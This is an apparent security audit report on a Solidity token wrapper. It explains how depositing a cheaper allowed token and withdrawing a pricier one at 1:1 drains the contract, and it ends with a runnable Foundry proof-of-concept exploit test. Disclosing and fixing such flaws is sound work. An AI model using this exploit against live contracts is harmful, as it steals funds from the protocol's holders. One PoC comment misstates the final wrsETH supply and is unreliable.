Audit Report

## Title
Cross-Token Arbitrage via Unrestricted 1:1 Deposit/Withdraw Across Multiple Allowed Tokens — (`contracts/L2/RsETHTokenWrapper.sol`)

## Summary
`RsETHTokenWrapper` allows any user to deposit one allowed token and withdraw a different allowed token at a strict 1:1 nominal ratio. Because `_deposit` and `_withdraw` each only check `allowedTokens[_asset]` with no per-token accounting and no cross-token restriction, an attacker can deposit a lower-priced bridge representation of rsETH and immediately redeem wrsETH for a higher-priced bridge representation, extracting value from the wrapper. The contract explicitly supports multiple allowed tokens via `reinitialize` and `addAllowedToken`, making this a deployed, reachable configuration.

## Finding Description
`_deposit` (L134–141) accepts any allowed token, transfers it in, and mints wrsETH 1:1:

```solidity
function _deposit(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);
    _mint(_to, _amount);
    emit Deposit(_asset, msg.sender, _to, _amount);
}
```

`_withdraw` (L120–128) burns wrsETH and transfers out any allowed token 1:1:

```solidity
function _withdraw(address _asset, address _to, uint256 _amount) internal {
    if (!allowedTokens[_asset]) revert TokenNotAllowed();
    _burn(msg.sender, _amount);
    ERC20Upgradeable(_asset).safeTransfer(_to, _amount);
    emit Withdraw(_asset, msg.sender, _to, _amount);
}
```

The only guard in both paths is the `allowedTokens` mapping. There is no linkage between which token was deposited and which token may be withdrawn, no per-token balance cap, and no oracle. `reinitialize` (L47–49) adds a second allowed token during the v2 upgrade, and `addAllowedToken` (L174–176) allows further tokens via `TIMELOCK_ROLE`. Multi-token operation is therefore an intended, deployed configuration.

Exploit path:
1. Wrapper holds N tokenB (market price > tokenA).
2. Attacker calls `deposit(tokenA, N)` → receives N wrsETH.
3. Attacker calls `withdraw(tokenB, N)` → burns N wrsETH, receives N tokenB.
4. Net: attacker profits the price spread × N. Wrapper now holds only tokenA; tokenB balance is zero.

Existing checks are insufficient: `allowedTokens` only verifies the token is permitted, not that the caller deposited that specific token or that per-token reserves are sufficient.

## Impact Explanation
**Critical — Protocol insolvency.** After the attack, the wrapper's aggregate collateral value (N tokenA at lower price) is less than the wrsETH `totalSupply()` value it must back. Any wrsETH holder expecting to redeem for tokenB cannot. The invariant stated in the NatSpec ("the alt rsETH tokens can be swapped 1:1 for the canonical rsETH token") is broken. The attack is bounded only by the wrapper's tokenB balance and the attacker's capital, and can be executed atomically in a single transaction.

## Likelihood Explanation
**High.** The exploit requires no privileged role, no oracle manipulation, no front-running, and no external protocol compromise. The only precondition is two allowed tokens with any non-zero price spread — a realistic and historically observed condition for different bridge representations of the same underlying asset (e.g., native bridge rsETH vs. LayerZero rsETH). The `reinitialize` function confirms the protocol already operates with at least two allowed tokens in production.

## Recommendation
1. **Per-token accounting**: Track per-depositor or per-token balances so withdrawal of a given token is capped by the amount of that token deposited (or held as reserves for it).
2. **Same-token restriction**: Require that the token withdrawn matches the token deposited, or maintain a per-token reserve ledger and enforce withdrawal against it.
3. **Oracle-based normalization**: If cross-token redemption is intentional, integrate a price oracle for each allowed token and normalize amounts to a common unit of account before minting/burning wrsETH, so 1 wrsETH always represents exactly 1 unit of canonical rsETH value regardless of which token is used.

## Proof of Concept
The following Foundry test demonstrates the exploit on unmodified production code:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {RsETHTokenWrapper} from "contracts/L2/RsETHTokenWrapper.sol";
import {ERC20Mock} from "path/to/ERC20Mock.sol";

contract CrossTokenArbitrageTest is Test {
    RsETHTokenWrapper wrapper;
    ERC20Mock tokenA; // cheaper bridge representation
    ERC20Mock tokenB; // more expensive bridge representation
    address admin        = address(0xA);
    address bridger      = address(0xB);
    address attacker     = address(0xC);
    address timelockRole = address(0xD);

    function setUp() public {
        tokenA = new ERC20Mock("altRsETH-A", "altA", 18);
        tokenB = new ERC20Mock("altRsETH-B", "altB", 18);

        vm.startPrank(admin);
        wrapper = new RsETHTokenWrapper();
        wrapper.initialize(admin, bridger, address(tokenA));
        wrapper.grantRole(wrapper.TIMELOCK_ROLE(), timelockRole);
        vm.stopPrank();

        vm.prank(timelockRole);
        wrapper.addAllowedToken(address(tokenB));

        // Seed wrapper with 1000 tokenB (prior bridger deposits)
        tokenB.mint(address(wrapper), 1000e18);
        vm.startPrank(admin);
        wrapper.grantRole(wrapper.MINTER_ROLE(), admin);
        wrapper.mint(address(0xDEAD), 1000e18); // existing wrsETH supply backed by tokenB
        vm.stopPrank();

        tokenA.mint(attacker, 1000e18);
    }

    function testCrossTokenArbitrage() public {
        vm.startPrank(attacker);
        tokenA.approve(address(wrapper), 1000e18);

        // Deposit cheap tokenA, receive wrsETH 1:1
        wrapper.deposit(address(tokenA), 1000e18);
        assertEq(wrapper.balanceOf(attacker), 1000e18);

        // Withdraw expensive tokenB 1:1 — no guard prevents cross-token redemption
        wrapper.withdraw(address(tokenB), 1000e18);

        assertEq(tokenB.balanceOf(attacker), 1000e18);   // attacker drained tokenB
        assertEq(tokenB.balanceOf(address(wrapper)), 0); // wrapper tokenB fully drained
        // wrsETH totalSupply still 2000e18, backed only by 1000 tokenA (lower value)
        vm.stopPrank();
    }
}
